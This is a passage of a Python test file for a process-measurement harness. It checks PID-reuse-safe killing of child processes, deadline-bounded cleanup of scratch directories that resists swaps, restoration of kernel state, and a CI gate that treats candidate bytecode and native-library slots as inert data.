    (tmp_path / 'root').mkdir()
    r = subprocess.run([sys.executable, '-c', KILL_AND_RECEIPT_PROBE, str(REPO / MEASURE), str(tmp_path / 'root')],
                       capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stdout + r.stderr
    seen = json.loads(r.stdout)
    assert seen['wrong'] == [] and seen['alive_after_wrong'], seen
    assert seen['right'] == [{'pid': seen['pid'], 'start_ticks': seen['start']}] and not seen['alive_after_right'], seen
    assert 'regular file' in seen['fifo'], seen
    # owned_children() lists only the direct children of a parent whose start ticks still match (PID 20 now has
    # start 200, not the listed 150, so its child 21 is not listed although it started after 150), not grandchildren,
    # nothing outside those parents, and no child that started before its parent (13: an earlier holder of PID 10
    # was its parent) (QUAL4 R1).
    assert seen['owned_children'] == [{'pid': 11, 'start_ticks': 110}], seen
    # kill_descendants() signals a generation only once its parent was identified and signalled: with 11 verified,
    # 11 then its child 12; with PID 11 now another process (start 120), 11 is unverified and 12, listed as its
    # child, is never examined, although 12's own start ticks still match (review 14 P1).
    assert seen['verified'] == {'sent': [11, 12], 'outcomes': {'11': 'signalled, not reaped by the deadline',
                                                               '12': 'signalled, not reaped by the deadline'}}, seen
    assert seen['reused'] == {'sent': [], 'outcomes': {'11': 'identity unverified'}}, seen
    # With 11 verified but its signal refused, 11 is not signalled, so 12, listed as its child, is never examined
    # either, although 12's own start ticks still match (QUAL7 R4 F1).
    assert seen['refused'] == {'sent': [], 'outcomes': {'11': 'signal refused'}}, seen


REUSED_IDENTITY_PROBE = r"""
import importlib.util,json,os,sys,time
s=importlib.util.spec_from_file_location('inventory_identity',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
# Fake PIDfds as in KILL_AND_RECEIPT_PROBE: `now` is each PID's current start ticks, `sent` the PIDs signalled.
fds,sent,refuse,now={},[],set(),{}
def fake_open(pid):fd=os.open(os.devnull,os.O_RDONLY);fds[fd]=pid;return fd
def fake_send(fd,sig):
    if fds[fd] in refuse:raise PermissionError(1,'Operation not permitted')
    sent.append(fds[fd])
m.os.pidfd_open=fake_open;m.signal.pidfd_send_signal=fake_send;m.process_start=lambda pid:now[pid]
key=lambda k:f'{k[0]}@{k[1]}' if isinstance(k,tuple) else str(k)
r={}
# PID 12 first held by a process with start 120 whose signal is refused, then reused by a process with start 200,
# listed as a child of the identified and signalled 10.
outcomes={};now.update({10:100,12:120});refuse.add(12)
m.kill_unregistered([{'pid':12,'start_ticks':120}],time.monotonic()+1,outcomes)
refuse.clear();now[12]=200;sent.clear()
m.kill_descendants([{'pid':10,'start_ticks':100}],{10:(100,1),12:(200,10)},time.monotonic()+1,outcomes)
r['traversal']={'sent':list(sent),'outcomes':{key(k):v for k,v in outcomes.items()}}
# The reason named for a remaining child is its own process's, not an earlier holder's of its PID.
outcomes={};now[12]=120;refuse.add(12)
m.kill_unregistered([{'pid':12,'start_ticks':120}],time.monotonic()+1,outcomes)
reasons=getattr(m,'unproven_reasons',lambda remaining,outcomes:'unproven_reasons absent')
r['reason_reused']=reasons([{'pid':12,'start_ticks':200}],outcomes)
r['reason_same']=reasons([{'pid':12,'start_ticks':120}],outcomes)
# A process already examined, by PID and start ticks, is not examined again when it is listed under another
# signalled parent: 12@200, already found unverified, is neither re-checked nor signalled (closure21 item 4).
outcomes={(12,200):'identity unverified'};refuse.clear();now.update({10:100,12:200});sent.clear()
m.kill_descendants([{'pid':10,'start_ticks':100}],{10:(100,1),12:(200,10)},time.monotonic()+1,outcomes)
r['dedup']={'sent':list(sent),'outcomes':{key(k):v for k,v in outcomes.items()}}
print(json.dumps(r))
"""


def test_measure_inventory_render_keys_cleanup_outcomes_by_pid_and_start_ticks(tmp_path):
    """A cleanup outcome belongs to one process, its PID and start ticks together (closure20): a later process at a
    PID an earlier one held is examined and signalled for itself, and a remaining child is named with its own
    reason, never the earlier holder's."""
    r = subprocess.run([sys.executable, '-c', REUSED_IDENTITY_PROBE, str(REPO / MEASURE)],
                       capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stdout + r.stderr
    seen = json.loads(r.stdout)
    # The earlier holder (start 120) keeps its refused outcome; the process now at PID 12 (start 200), listed under
    # the signalled 10, is examined and signalled.
    assert seen['traversal'] == {'sent': [12], 'outcomes': {'12@120': 'signal refused',
                                                            '12@200': 'signalled, not reaped by the deadline'}}, seen
    assert seen['reason_reused'] == {'12': 'not examined before the deadline'}, seen
    assert seen['reason_same'] == {'12': 'signal refused'}, seen
    assert seen['dedup'] == {'sent': [], 'outcomes': {'12@200': 'identity unverified'}}, seen


def test_measure_inventory_render_keeps_and_attributes_a_root_whose_rmdir_fails(tmp_path):
    """A file arriving after clearing fails the final rmdir: the root is kept and its receipt says why (QUAL1 R4 F3)."""
    report, _, outer, _ = scratch_measurement(tmp_path, 'late-writer')
    assert report['owned_family_gone'] and report['scratch_root_retained_reason'] == 'removal_failed', report
    assert 'Directory not empty' in report['scratch_root_error'], report
    events = report['receipts'][0]
    assert events and [e['event'] for e in events] == ['removal_failed'] and 'Directory not empty' in events[0]['error'], report


def test_measure_inventory_render_refuses_a_receipt_that_is_not_a_regular_file(tmp_path):
    """A FIFO put in the receipt's place is refused at once, never waited on (QUAL1 R4 F2)."""
    report, _, outer, _ = scratch_measurement(tmp_path, 'receipt-fifo', seconds=2)
    assert not report['ok'] and report['owned_family_gone'] and report['measured_elapsed'] < 4, report
    # O_NONBLOCK: with no reader the open fails with ENXIO at once instead of waiting for one.
    assert report['reason'] == 'observation_failure' and 'CREATED-BY' in report['error'], report


def test_measure_inventory_render_scratch_cleanup_before_start_and_at_deadline(tmp_path):
    """A run that fails before any child starts removes its root; cleanup never outlasts the command's deadline."""
    for mode in ('prestart', 'receipt-failure'):
        report, child, outer, _ = scratch_measurement(tmp_path, mode)
        assert not report['ok'] and report['reason'] == 'observation_failure' and 'process_group' not in report, (mode, report)
        assert report['scratch_root'] and report['scratch_root_removed'] and report['outer_after'] == [], (mode, report)
        assert child is None, (mode, child)
    # Removal that cannot finish in time stops at the deadline and keeps the root (and its receipt) rather than overrun.
    report, _, outer, _ = scratch_measurement(tmp_path, 'slow-removal')
    assert report['reason'] == 'completed' or report['reason'] == 'scratch_cleanup_incomplete', report
    assert report['scratch_root_retained_reason'] == 'removal_deadline' and not report['scratch_root_removed'], report
    assert report['elapsed_seconds'] <= 1 and report['measured_elapsed'] <= 1.05 and report['receipts'][0], report
    report, _, outer, _ = scratch_measurement(tmp_path, 'manyfiles')
    assert report['reason'] == 'time_limit' and report['owned_family_gone'], report
    assert report['elapsed_seconds'] <= 1 and report['measured_elapsed'] <= 1.05, report
    if report['scratch_root_removed']:
        assert report['outer_after'] == [], report
    else:
        assert report['scratch_root_retained_reason'] == 'removal_deadline', report
        assert report['outer_after'] == [Path(report['scratch_root']).name] and report['receipts'][0], report

def test_measure_inventory_render_scratch_root_swapped_after_receipt_is_not_removed(tmp_path):
    """The final rmdir checks the name against the held identity; a swapped name is never removed."""
    # The name swapped for an empty decoy after the receipt goes: the decoy is not removed, the original is kept
    # and says why in a receipt written through its own descriptor.
    report, _, outer, _ = scratch_measurement(tmp_path, 'rmdir-swap')
    root = Path(report['scratch_root'])
    assert report['owned_family_gone'] and report['scratch_root_retained_reason'] == 'removal_failed', report
    assert not report['scratch_root_removed'] and 'no longer the directory' in report['scratch_root_error'], report
    assert root.is_dir() and os.listdir(root) == [] and report['outer_after'] == [root.name, root.name + '.orig'], report
    aborted = [json.loads(line) for line in (outer / (root.name + '.orig') / 'CREATED-BY').read_text().splitlines()]
    assert [e['event'] for e in aborted] == ['removal_aborted'], aborted


def test_measure_inventory_render_scratch_receipt_follows_the_held_root(tmp_path):
    """A root renamed and replaced by a link before the worker receipt is written: the receipt still lands in the
    directory the monitor created, nothing is written through the link, and the root is kept."""
    report, _, outer, victim = scratch_measurement(tmp_path, 'receipt-redirect', seconds=2)
    root = Path(report['scratch_root'])
    assert report['victim_after'] == [] and report['scratch_root_retained_reason'] == 'removal_failed', report
    moved = [json.loads(line) for line in (outer / (root.name + '.moved') / 'CREATED-BY').read_text().splitlines()]
    assert [e['event'] for e in moved] == ['created', 'worker'] and moved[1]['worker_pid'] == report['process_group'], moved


def test_measure_inventory_render_scratch_subdirectory_swap_is_not_followed(tmp_path):
    """A subdirectory swapped for a link to an outside directory after it was listed is never descended into."""
    report, _, outer, victim = scratch_measurement(tmp_path, 'subdir-swap')
    assert report['scratch_root_retained_reason'] == 'removal_failed' and report['victim_after'] == ['keep.txt'], report
    assert (victim / 'keep.txt').read_text() == 'keep' and report['receipts'][0], report


def test_measure_inventory_render_scratch_receipt_is_removed_last(tmp_path):
    """The receipt is the last entry removed, immediately before the root itself."""
    report, _, outer, _ = scratch_measurement(tmp_path, 'order')
    assert report['scratch_root_removed'] and report['outer_after'] == [], report
    names = [name for _, name in report['ops']]
    assert report['ops'][-2:] == [['unlink', 'CREATED-BY'], ['rmdir', Path(report['scratch_root']).name]], report['ops']
    assert names.count('CREATED-BY') == 1 and {'a', 'b', 'c', 'sub'} <= set(names), report['ops']


def test_measure_inventory_render_scratch_slow_listing_keeps_the_deadline(tmp_path):
    """A slow listing is bounded entry by entry: the deadline holds and the root is kept with its receipt."""
    report, _, outer, _ = scratch_measurement(tmp_path, 'slow-listing')
    assert report['scratch_root_retained_reason'] == 'removal_deadline' and report['receipts'][0], report
    assert report['elapsed_seconds'] <= 1 and report['measured_elapsed'] <= 1.05, report


def test_measure_inventory_render_scratch_spawn_failure_retention(tmp_path):
    """Popen refusing before it forks leaves no child, so the root is removed; an unreadable process table keeps it."""
    report, child, outer, _ = scratch_measurement(tmp_path, 'prefork')
    assert report['reason'] == 'observation_failure' and 'process_group' not in report and child is None, report
    assert report['scratch_root_unregistered_children'] == [] and report['scratch_root_removed'], report
    assert report['outer_after'] == [], report
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-unknown', seconds=2)
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'], report
    kept = report['outer_after']
    assert len(kept) == 1 and kept[0].startswith('measure-render-'), report
    assert [e['event'] for e in report['receipts'][0]] == ['created'], report
    assert f"retained {outer / kept[0]} (spawn_children_unknown)" in report['notice'], report
    # The kill pass's own process-table read fails after the children were listed: the listed child is still
    # killed and reaped, then the failure propagates as a failed relist does and the root is kept (review 14 P2).
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-table-unreadable', seconds=2)
    assert report['raised'] == 'KeyboardInterrupt' and not report['spawned']['alive'], report   # it sleeps 20 s
    kept = report['outer_after']
    assert len(kept) == 1 and kept[0].startswith('measure-render-'), report
    assert f"retained {outer / kept[0]} (spawn_children_unknown): OSError: process table unreadable" in report['notice'], report
    assert report['children_after_cleanup'] == [], report
    # The failing read is the kill pass's own snapshot, not the relist: one listing ran, and the failure propagated
    # before any relist (QUAL7 R4 F2).
    assert report['table_failure'] == ['failed directly'] and report['listings'] == 1, report


def test_measure_inventory_render_bounds_public_output_delivery(tmp_path):
    """Real FIFO and full stdout-pipe backpressure cannot outlive the same whole public CLI bound."""
    import fcntl
    import time
    fifo = tmp_path/'no-reader';os.mkfifo(fifo)
    args = [sys.executable,str(REPO/MEASURE),'--max-rss-mib','1','--max-seconds','.2']
    started=time.monotonic()
    good=subprocess.run([*args,'--output',str(tmp_path/'ordinary.json')],capture_output=True,text=True,timeout=2)
    assert good.returncode==1 and json.loads(good.stdout)['ok'] is False and time.monotonic()-started<1
    started=time.monotonic()
    blocked=subprocess.Popen([*args,'--output',str(fifo)],stdout=subprocess.PIPE,stderr=subprocess.PIPE,start_new_session=True)
    try:
        out,err=blocked.communicate(timeout=1)
        assert blocked.returncode!=0 and time.monotonic()-started<.8, (out,err)
    finally:
        if blocked.poll() is None:os.killpg(blocked.pid,9);blocked.communicate(timeout=1)
    readfd,writefd=os.pipe();fcntl.fcntl(writefd,fcntl.F_SETPIPE_SZ,4096);os.write(writefd,b'x'*4096)
    try:
        started=time.monotonic();blocked=subprocess.Popen(args,stdout=writefd,stderr=subprocess.PIPE,start_new_session=True)
        try:
            blocked.wait(timeout=1)
            assert blocked.returncode!=0 and time.monotonic()-started<.8
        finally:
            if blocked.poll() is None:os.killpg(blocked.pid,9);blocked.wait(timeout=1)
            blocked.stderr.close()
    finally:os.close(readfd);os.close(writefd)


def test_measure_inventory_render_never_kills_an_existing_unrelated_child(tmp_path):
    """Private harness refuses ambiguous ownership before launch, leaving a preexisting child untouched."""
    launcher = ("import importlib.util,json,pathlib,subprocess,sys; "
                "s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]); "
                "m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m); "
                "p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(20)']); "
                "\ntry:\n r=m.run_bounded([sys.executable,'-c','pass'],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1);"
                "r['unrelated_alive']=p.poll() is None;print(json.dumps(r))"
                "\nfinally:p.kill();p.wait()")
    r=subprocess.run([sys.executable,'-c',launcher,str(REPO/MEASURE)],capture_output=True,text=True,timeout=4)
    assert r.returncode==0, r.stdout+r.stderr
    evidence=json.loads(r.stdout)
    assert not evidence['ok'] and evidence['unrelated_alive'] and 'process_group' not in evidence, evidence
    assert 'exclusive descendant ownership' in evidence['error'], evidence


def test_measure_inventory_render_bounds_startup_usage_output(tmp_path):
    """Help and parse errors use the same deadline and unbuffered bounded delivery as the final verdict."""
    import fcntl
    import time
    for option in ('--help','--unknown-option'):
        readfd,writefd=os.pipe();fcntl.fcntl(writefd,fcntl.F_SETPIPE_SZ,4096);os.write(writefd,b'x'*4096)
        try:
            started=time.monotonic()
            p=subprocess.Popen([sys.executable,str(REPO/MEASURE),'--max-seconds','.2',option],
                               stdout=writefd,stderr=writefd,start_new_session=True)
            try:
                p.wait(timeout=1)
                assert p.returncode!=0 and time.monotonic()-started<.8
            finally:
                if p.poll() is None:os.killpg(p.pid,9);p.wait(timeout=1)
        finally:os.close(readfd);os.close(writefd)


LIFECYCLE_PROBE = r'''
import ctypes,importlib.util,json,os,pathlib,signal,subprocess,sys,time
s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
mode=sys.argv[2];children=[];opened=[];report=None;outer=None
hits=dict(popen=0,table_fault=0,pidfd=0,pidfd_delay=0,pidfd_failure=0,spawn_delay=0,rss_fault=0,cleanup_delay=0,prior_get_failure=0)
handler=signal.getsignal(signal.SIGALRM);mask=signal.pthread_sigmask(signal.SIG_BLOCK,set())
native=ctypes.CDLL(None,use_errno=True);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0
native.prctl(36,1,0,0,0)
real_popen=m.subprocess.Popen;real_table=m.process_table;real_pidfd=m.os.pidfd_open;real_cdll=m.ctypes.CDLL;real_cleanup=m.OwnedFamily.terminate_and_reap;real_rss=m.rss
calls=0

def table():
 global calls
 calls+=1
 if mode=='read-after' and calls<3:return real_table()
 hits['table_fault']+=1
 raise OSError('actual process-table read boundary unavailable')
def popen(*a,**kw):
 p=real_popen(*a,**kw);children.append(p);hits['popen']+=1
 if mode in ('read-before','read-after'):m.process_table=table
 if mode=='spawn-delay':hits['spawn_delay']+=1;time.sleep(.3)
 return p
def pidfd(*a,**kw):
 hits['pidfd']+=1
 if mode=='pidfd-failure':hits['pidfd_failure']+=1;raise OSError('actual descriptor acquisition boundary unavailable')
 fd=real_pidfd(*a,**kw);opened.append(fd)
 if mode=='pidfd-delay':hits['pidfd_delay']+=1;time.sleep(.3)
 return fd
def cleanup(*a,**kw):
 if mode=='cleanup-delay':hits['cleanup_delay']+=1;time.sleep(.3)
 return real_cleanup(*a,**kw)
def rss(pid):
 if mode in ('cleanup-delay','cleanup-control') and pid!=os.getpid():hits['rss_fault']+=1;raise OSError('actual child RSS read boundary unavailable')
 return real_rss(pid)
class NoPriorState:
 def prctl(self,operation,*a):
  if operation==37:hits['prior_get_failure']+=1;return -1
  return native.prctl(operation,*a)
m.subprocess.Popen=popen;m.os.pidfd_open=pidfd;m.OwnedFamily.terminate_and_reap=cleanup;m.rss=rss
if mode=='prior-state-failure':m.ctypes.CDLL=lambda *a,**kw:NoPriorState()
try:
 try:
  limit=1 if mode in ('accepted','cleanup-control','read-after') else .15   # read-after must reach its third read even when the spawn is slow (#1700 attempt 3)
  with m.deadline_guard(time.monotonic()+limit):
   report=m.run_bounded([sys.executable,'-c','import signal,time;assert signal.SIGALRM not in signal.pthread_sigmask(signal.SIG_BLOCK,set());time.sleep(.02)' if mode=='accepted' else 'import time;time.sleep(20)'],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=limit)
 except m.DeliveryDeadline as e:outer=str(e)
 finally:
  m.subprocess.Popen=real_popen;m.process_table=real_table;m.os.pidfd_open=real_pidfd;m.ctypes.CDLL=real_cdll;m.OwnedFamily.terminate_and_reap=real_cleanup;m.rss=real_rss
 alive=[p.pid for p in children if p.poll() is None]
 leaked=[]
 for fd in opened:
  try:os.fstat(fd);leaked.append(fd)
  except OSError:pass
 state=ctypes.c_int();assert native.prctl(37,ctypes.byref(state),0,0,0)==0
 result=dict(report=report,outer_deadline=outer,native_children_alive_after_monitor=alive,pidfds_live_after_monitor=leaked,subreaper_after=state.value,mask_restored=signal.pthread_sigmask(signal.SIG_BLOCK,set())==mask,handler_restored=signal.getsignal(signal.SIGALRM)==handler,timer=signal.getitimer(signal.ITIMER_REAL),fault_boundary_hits=hits,native_children_created=len(children),native_pidfds_opened=len(opened))
finally:
 for p in children:
  if p.poll() is None:p.kill()
  p.wait()
 for fd in opened:
  try:os.close(fd)
  except OSError:pass
 native.prctl(36,prior.value,0,0,0)
result['all_fixture_children_reaped']=all(p.returncode is not None for p in children)
print(json.dumps(result))
'''


def test_measure_inventory_render_acquires_and_unwinds_actual_kernel_resources(tmp_path):
    """Native read/acquisition/cleanup alarms preserve process, PIDfd, caller-mask and prior-state ownership."""
    modes=('accepted','read-before','read-after','cleanup-control','spawn-delay','pidfd-delay','pidfd-failure','cleanup-delay','prior-state-failure')
    results={}
    for mode in modes:
        scratch=tmp_path/f'tmp-{mode}';scratch.mkdir()   # monitor scratch roots stay inside this test's tmp_path
        r=subprocess.run([sys.executable,'-c',LIFECYCLE_PROBE,str(REPO/MEASURE),mode],cwd=tmp_path,env={**os.environ,'TMPDIR':str(scratch)},
                         capture_output=True,text=True,timeout=5)
        assert r.returncode==0, (mode,r.stdout,r.stderr)
        results[mode]=json.loads(r.stdout)
    (tmp_path/'lifecycle-results.json').write_text(json.dumps(results,indent=2))
    assert results['accepted']['report']['ok'], results['accepted']
    assert all(not x['native_children_alive_after_monitor'] and not x['pidfds_live_after_monitor'] for x in results.values()), results
    assert all(x['subreaper_after']==1 and x['mask_restored'] and x['handler_restored'] and x['timer']==[0,0] for x in results.values()), results
    assert all(x['all_fixture_children_reaped'] for x in results.values())
    assert all(not x['report'] or not x['report']['ok'] for name,x in results.items() if name!='accepted'), results
    boundaries={'read-before':'table_fault','read-after':'table_fault','cleanup-control':'rss_fault',
                'spawn-delay':'spawn_delay','pidfd-delay':'pidfd_delay','pidfd-failure':'pidfd_failure',
                'cleanup-delay':'cleanup_delay','prior-state-failure':'prior_get_failure'}
    assert all(results[name]['fault_boundary_hits'][boundary]>0 for name,boundary in boundaries.items()),results
    assert all(x['native_children_created']==1 for name,x in results.items() if name!='prior-state-failure'),results
    assert results['prior-state-failure']['native_children_created']==0,results
    assert all(x['native_pidfds_opened']>0 for name,x in results.items() if name not in ('prior-state-failure','pidfd-failure')),results


RECOVERY_PROBE = r"""
import ctypes,importlib.util,json,os,pathlib,signal,subprocess,sys,time
s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
mode=sys.argv[2];pidfile=pathlib.Path('recovery-pids.json');native=ctypes.CDLL(None);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0;assert native.prctl(36,1,0,0,0)==0
real_popen=m.subprocess.Popen;real_table=m.process_table;real_scandir=m.os.scandir;real_read=pathlib.Path.read_bytes;root=None;targets=[]
code='''import os,sys,time,json
if os.fork()==0:
 os.setsid()
 child=os.getpid()
 grand=os.fork()
 if grand==0:
  time.sleep(20)
  os._exit(0)
 open(sys.argv[1],'w').write(json.dumps([child,grand]))
 time.sleep(20)
 os._exit(0)
time.sleep(20)
'''
def lost():raise OSError('general full-table observation unavailable after native fork')
def scan(*a,**kw):raise OSError('independent raw directory observation also unavailable')
def read(path,*a,**kw):
 if str(path)==f'/proc/{os.getppid()}/stat':
  if mode=='unrelated-malformed':return b'malformed stable process identity'
  raise OSError('unrelated stable entry inaccessible')
 return real_read(path,*a,**kw)
def popen(*a,**kw):
 global root,targets
 root=real_popen(*a,**kw)
 if mode!='accepted':
  for _ in range(1500):
   if pidfile.exists():
    try:targets=json.loads(pidfile.read_text());break
    except ValueError:pass
   time.sleep(.001)
  assert len(targets)==2
  m.process_table=lost
  if mode=='both-unavailable':m.os.scandir=scan
  if mode in ('unrelated-unreadable','unrelated-malformed'):pathlib.Path.read_bytes=read
 return root
m.subprocess.Popen=popen
try:
 report=m.run_bounded([sys.executable,'-I','-B','-c','import time;time.sleep(.02)' if mode=='accepted' else code,str(pidfile)],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1)
 result=dict(report=report,root_reaped=root.poll() is not None,descendants_alive=[pid for pid in targets if pathlib.Path('/proc',str(pid)).exists()])
finally:
 m.subprocess.Popen=real_popen;m.process_table=real_table;m.os.scandir=real_scandir;pathlib.Path.read_bytes=real_read
 if root is not None:
  if root.poll() is None:root.kill()
  root.wait()
 for pid in targets:
  try:os.kill(pid,signal.SIGKILL)
  except ProcessLookupError:pass
 for _ in range(1000):
  for pid in targets:
   try:os.waitpid(pid,os.WNOHANG)
   except ChildProcessError:pass
  if not any(pathlib.Path('/proc',str(pid)).exists() for pid in targets):break
  time.sleep(.001)
 native.prctl(36,prior.value,0,0,0)
result['fixture_cleanup_complete']=not any(pathlib.Path('/proc',str(pid)).exists() for pid in targets)
print(json.dumps(result))
"""


def test_measure_inventory_render_recovers_unseen_owned_descendants(tmp_path):
    """Native fork/setsid/grandchild precedes collector loss; independent relationship cleanup owns it safely."""
    results={}
    for mode in ('accepted','collector-unavailable','unrelated-unreadable','unrelated-malformed','both-unavailable'):
        directory=tmp_path/mode;directory.mkdir()
        scratch=directory/'tmp';scratch.mkdir()   # monitor scratch roots stay inside this test's tmp_path
        r=subprocess.run([sys.executable,'-c',RECOVERY_PROBE,str(REPO/MEASURE),mode],cwd=directory,env={**os.environ,'TMPDIR':str(scratch)},
                         capture_output=True,text=True,timeout=5)
        assert r.returncode==0,(mode,r.stdout,r.stderr)
        results[mode]=json.loads(r.stdout)
    (tmp_path/'recovery-results.json').write_text(json.dumps(results,indent=2))
    assert results['accepted']['report']['ok'] and results['accepted']['report']['owned_family_gone'],results
    assert all(x['root_reaped'] and x['fixture_cleanup_complete'] for x in results.values()),results
    for mode in ('collector-unavailable','unrelated-unreadable','unrelated-malformed'):
        assert not results[mode]['report']['ok'] and not results[mode]['descendants_alive'],results
    assert results['collector-unavailable']['report']['owned_family_gone'],results
    # Unreadable stable entries leave uncertainty, even when every actually owned process was stopped.
    assert not results['unrelated-unreadable']['report']['owned_family_gone'],results
    assert not results['unrelated-malformed']['report']['owned_family_gone'],results
    # Both real observation paths can be unavailable; known root cleanup still runs, with no false family claim.
    assert not results['both-unavailable']['report']['ok'] and not results['both-unavailable']['report']['owned_family_gone'],results


NATIVE_NAME_PROBE = r'''
import ctypes,importlib.util,json,os,pathlib,signal,subprocess,sys,time
s=importlib.util.spec_from_file_location('inventory_budget',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
mode=sys.argv[2];native=ctypes.CDLL(None);prior=ctypes.c_int();assert native.prctl(37,ctypes.byref(prior),0,0,0)==0;assert native.prctl(36,1,0,0,0)==0
oldname=ctypes.create_string_buffer(16);assert native.prctl(16,oldname,0,0,0)==0
real_popen=m.subprocess.Popen;real_sample=m.OwnedFamily.sample;real_identity=m.process_identity;root=None;hits=dict(native_name=False,sample_barrier=0,parser_failure=0);ready=pathlib.Path('native-name.ready');go=pathlib.Path('native-name.go')
code="import ctypes,pathlib,sys,time;"+("\nwhile not pathlib.Path(sys.argv[2]).exists():time.sleep(.001)\n" if mode=='after-admission' else '')+"assert ctypes.CDLL(None).prctl(15,ctypes.c_char_p(b'bad-\\xff'),0,0,0)==0;pathlib.Path(sys.argv[1]).write_text('ready');time.sleep(.05)"
def wait_name():
 for _ in range(1000):
  if ready.exists():break
  time.sleep(.001)
 assert ready.exists()
 hits['native_name']=b'bad-\xff' in pathlib.Path('/proc',str(root.pid),'stat').read_bytes()
 assert hits['native_name']
def identity(pid):
 if root is not None and pid==root.pid:hits['parser_failure']+=1;raise ValueError('ordinary identity parser boundary failure')
 return real_identity(pid)
def popen(*a,**kw):
 global root
 root=real_popen(*a,**kw)
 if mode=='before-admission':wait_name()
 if mode=='parser-failure':m.process_identity=identity
 return root
def sample(family):
 if mode=='after-admission' and root is not None and not hits['sample_barrier']:
  assert family.snapshot().get(root.pid) is not None
  hits['sample_barrier']+=1;go.write_text('go');wait_name()
 return real_sample(family)
m.subprocess.Popen=popen;m.OwnedFamily.sample=sample
if mode=='unrelated-native-name':
 assert native.prctl(15,ctypes.c_char_p(b'bad-\xff'),0,0,0)==0
 hits['native_name']=b'bad-\xff' in pathlib.Path('/proc/self/stat').read_bytes()
try:
 try:
  report=m.run_bounded([sys.executable,'-I','-B','-c',code if mode in ('before-admission','after-admission') else 'import time;time.sleep(20)' if mode=='parser-failure' else 'pass',str(ready),str(go)],pathlib.Path.cwd(),max_rss_bytes=128*1024*1024,max_seconds=1)
  result=dict(report=report,escaped_exception=None)
 except Exception as e:result=dict(report=None,escaped_exception=type(e).__name__+': '+str(e))
 result.update(root_created=root is not None,root_alive_after_monitor=root is not None and root.poll() is None,hits=hits)
 state=ctypes.c_int();assert native.prctl(37,ctypes.byref(state),0,0,0)==0;result['subreaper_restored']=state.value==1
finally:
 m.subprocess.Popen=real_popen;m.OwnedFamily.sample=real_sample;m.process_identity=real_identity
 if root is not None:
  if root.poll() is None:root.kill()
  root.wait()
 native.prctl(15,oldname,0,0,0);native.prctl(36,prior.value,0,0,0)
result['fixture_reaped']=root is None or root.returncode is not None
print(json.dumps(result))
'''


def test_measure_inventory_render_reads_native_process_names_as_bytes(tmp_path):
    """Real PR_SET_NAME 0xff before root admission/after sampling and outside the family needs no decoding."""
    results={}
    for mode in ('ascii','before-admission','after-admission','unrelated-native-name','parser-failure'):
        directory=tmp_path/mode;directory.mkdir()
        scratch=directory/'tmp';scratch.mkdir()   # monitor scratch roots stay inside this test's tmp_path
        r=subprocess.run([sys.executable,'-c',NATIVE_NAME_PROBE,str(REPO/MEASURE),mode],cwd=directory,env={**os.environ,'TMPDIR':str(scratch)},
                         capture_output=True,text=True,timeout=5)
        assert r.returncode==0,(mode,r.stdout,r.stderr)
        results[mode]=json.loads(r.stdout)
    (tmp_path/'native-name-results.json').write_text(json.dumps(results,indent=2))
    assert all(x['escaped_exception'] is None and not x['root_alive_after_monitor'] and x['subreaper_restored'] and x['fixture_reaped'] for x in results.values()),results
    for mode in ('ascii','before-admission','after-admission','unrelated-native-name'):
        assert results[mode]['root_created'] and results[mode]['report']['ok'] and results[mode]['report']['owned_family_gone'],results
    assert all(results[mode]['hits']['native_name'] for mode in ('before-admission','after-admission','unrelated-native-name')),results
    assert results['after-admission']['hits']['sample_barrier']==1,results
    assert results['parser-failure']['root_created'] and results['parser-failure']['hits']['parser_failure']>0 and not results['parser-failure']['report']['ok'],results


def base_checkout_input_pr(repo: Path, branch: str, files: dict[str, str], **meta):
    """Read candidate inert slots only as Git data, matching the public BASE-checkout gate job."""
    change(repo,branch,files)
    base,head=base_and_head(repo)
    _git(repo,'checkout','-q','-f','main')
    return gate(repo,'--pr',base,head,PR_HEAD_REF=branch,**meta)


def test_effective_python_input_slots_have_inert_native_admission_controls(repo):
    """Inert bytes prove startup-slot ownership without executing candidate cache/native artifacts."""
    ci_branch='fix/feat-cicd-001-startup-slots';ci_spec='docs/superpowers/specs/2026-09-01-startup-slots.md';ci_plan='docs/superpowers/plans/2026-09-01-startup-slots.md'
    row=CATALOG_TEXT.replace('| [FEAT-DATA-001]','| [FEAT-CICD-001](#feat-cicd-001) | CI | Production | unknown | none |\n| [FEAT-DATA-001]',1)
    sources={'scripts/maintenance/doc_inventory.py','scripts/maintenance/check_generated_docs.py','scripts/maintenance/__init__.py','scripts/maintenance/doc_source_snapshot.py','tests/scripts/measure_inventory_render.py'}
    on_base(repo,{CATALOG:row,ci_spec:spec(feat_id='FEAT-CICD-001'),ci_plan:plan(feat_id='FEAT-CICD-001',spec=ci_spec,branch=ci_branch),**{p:'# Trusted source-presence fixture; not executed.\n' for p in sources}})
    tag=sys.implementation.cache_tag;inert='Inert admission fixture: not executable bytecode or a native library.\n'
    slots=(f'scripts/maintenance/__pycache__/doc_inventory.{tag}.pyc',f'scripts/maintenance/__pycache__/__init__.{tag}.opt-1.pyc','scripts/maintenance/check_generated_docs.abi3.so','scripts/maintenance/doc_inventory.pyc',f'tests/scripts/__pycache__/measure_inventory_render.{tag}.pyc')
    control=base_checkout_input_pr(repo,BRANCH,{**CODE,'scripts/maintenance/cache-notes.bin':inert},**DOCS_OK)
    results={p:base_checkout_input_pr(repo,BRANCH,{**CODE,p:inert},**DOCS_OK) for p in slots}
